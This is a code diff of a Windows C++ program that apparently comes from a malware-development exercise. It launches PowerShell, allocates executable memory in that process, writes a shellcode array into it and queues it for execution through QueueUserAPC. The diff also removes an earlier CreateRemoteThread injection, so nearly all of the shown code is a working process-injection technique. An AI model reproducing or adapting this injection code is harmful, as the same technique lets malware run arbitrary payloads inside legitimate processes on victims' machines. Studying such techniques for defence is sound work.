@@ -40,14 +40,7 @@ unsigned char shellcode[] = {
   0x4f, 0x3a, 0x20, 0x4d, 0x61, 0x6c, 0x44, 0x65, 0x76, 0x00
 };
 
-DWORD WINAPI MyThreadFunction() {
-	MessageBox(NULL, (LPCWSTR)L"Thread Created!", (LPCWSTR)L"Thread Created!", MB_OK);
-	return 0;
-}
-
 int main() {
-
-	//HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS | TH32CS_SNAPTHREAD, 0);
 	HANDLE victimProcess = NULL;
 	PROCESSENTRY32 processEntry = { sizeof(PROCESSENTRY32) };
 	THREADENTRY32 threadEntry = { sizeof(THREADENTRY32) };
@@ -55,49 +48,35 @@ int main() {
 	SIZE_T shellSize = sizeof(shellcode);
 	HANDLE threadHandle = NULL;
 
-	printf("%s To start, we will open the File Explorer\n", k);
+	printf("%s To start, we will open the Microsoft Powrshell\n", k);
 	system("pause");
-	STARTUPINFO si = { sizeof(si) };
+
+	STARTUPINFOA si = { sizeof(si) };
 	PROCESS_INFORMATION pi;
 
-	// Start the Notepad process
-	int status = CreateProcess(TEXT("C:\\Windows\\explorer.exe"), // Application name
-		NULL,   // Command line arguments
+	LPCSTR command = "powershell.exe -NoExit";  // Opens PowerShell and keeps it open
+
+	// Start the Powershell process
+	int status = CreateProcessA(NULL, // Application name
+		(LPSTR)command,   // Command line arguments
 		NULL,   // Process handle not inheritable
 		NULL,   // Thread handle not inheritable
 		FALSE,  // Set handle inheritance to FALSE
-		0,      // No creation flags
+		CREATE_NEW_CONSOLE,      // No creation flags
 		NULL,   // Use parent's environment block
 		NULL,   // Use parent's starting directory 
 		&si,    // Pointer to STARTUPINFO structure
 		&pi);    // Pointer to PROCESS_INFORMATION structure
 
+	victimProcess = pi.hProcess;
+	printf("%s PID %ld\n", k, pi.dwProcessId);
+	system("pause");
 	if (!status) {
 		printf("%s failed open process, error: %ld", e, GetLastError());
 		return EXIT_FAILURE;
 	}
-	victimProcess = pi.hProcess;
-	//victimProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pi.dwProcessId);
 
-	LPVOID remoteMemory = VirtualAllocEx(victimProcess, NULL, 1024, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
-	WriteProcessMemory(victimProcess, remoteMemory, (LPVOID)MyThreadFunction, 1024, NULL);
-
-	HANDLE hThread = CreateRemoteThread(victimProcess, NULL, 0, (LPTHREAD_START_ROUTINE)remoteMemory, NULL, 0, NULL);
-
-	if (hThread == NULL) {
-		printf("%s failed to get a handle to the thread, error: %ld", e, GetLastError());
-		CloseHandle(victimProcess);
-		return EXIT_FAILURE;
-	}
-
-	printf("%s Waiting for thread to finish %ld\n", k);
-	WaitForSingleObject(hThread, INFINITE);
-	// Sleep for one second to allow Explorer to open
-	std::this_thread::sleep_for(std::chrono::milliseconds(5000));
 	HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS | TH32CS_SNAPTHREAD, 0);
-
-	printf("%s Process ID %ld\n", e, pi.dwProcessId);
-	printf("%s Snapshot %ld\n", e, snapshot);
 
 	if (Process32First(snapshot, &processEntry)) {
 		do {
@@ -106,28 +85,24 @@ int main() {
 			}
 		} while (Process32Next(snapshot, &processEntry));
 	}
-	
-	/*if (Process32First(snapshot, &processEntry)) {
-		while (_wcsicmp(processEntry.szExeFile, L"explorer.exe") != 0) {
-			Process32Next(snapshot, &processEntry);
-		}
-	}
 
-	victimProcess = OpenProcess(PROCESS_ALL_ACCESS, 0, processEntry.th32ProcessID);*/
-
-	std::cout << "processEntry th32ProcessID " << processEntry.th32ProcessID << std::endl;
 	/* allocate bytes to process memory */
 	printf("%s Now, we will allocate the memory for our injection\n", k);
-	printf("%s \n", k);
-	//system("pause");
+	system("pause");
 	LPVOID shellAddress = VirtualAllocEx(victimProcess, NULL, shellSize, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
-	PTHREAD_START_ROUTINE apcRoutine = (PTHREAD_START_ROUTINE)shellAddress;
-	WriteProcessMemory(victimProcess, shellAddress, shellcode, shellSize, NULL);
+	printf("%s allocated %zu-bytes with rwx permissions on address: 0x%p\n", k, sizeof(shellcode), shellAddress);
+	system("pause");
 
-	printf("%s Looking for threads\n", e);
+	PTHREAD_START_ROUTINE apcRoutine = (PTHREAD_START_ROUTINE)shellAddress;
+	BOOL writeResult = WriteProcessMemory(victimProcess, shellAddress, shellcode, shellSize, NULL);
+	if (!writeResult) {
+		printf("%s Failed to write shellcode. Error: %ld\n", e, GetLastError());
+		return EXIT_FAILURE;
+	}
+
 	if (Thread32First(snapshot, &threadEntry)) {
 		do {
-			printf("%s Owner process Id %ld\n", e, threadEntry.th32OwnerProcessID);
+			//printf("%s Owner process Id %ld\n", e, threadEntry.th32OwnerProcessID);
 			if (threadEntry.th32OwnerProcessID == pi.dwProcessId) {
 				threadIds.push_back(threadEntry.th32ThreadID);
 			}
@@ -135,9 +110,10 @@ int main() {
 	}
 
 	for (DWORD threadId : threadIds) {
+		printf("%s Queueing APC on the thread: %ld\n", k, threadId);
 		threadHandle = OpenThread(THREAD_ALL_ACCESS, TRUE, threadId);
 		QueueUserAPC((PAPCFUNC)apcRoutine, threadHandle, NULL);
-		Sleep(1000 * 2);
+		break;
 	}
 	system("pause");
 
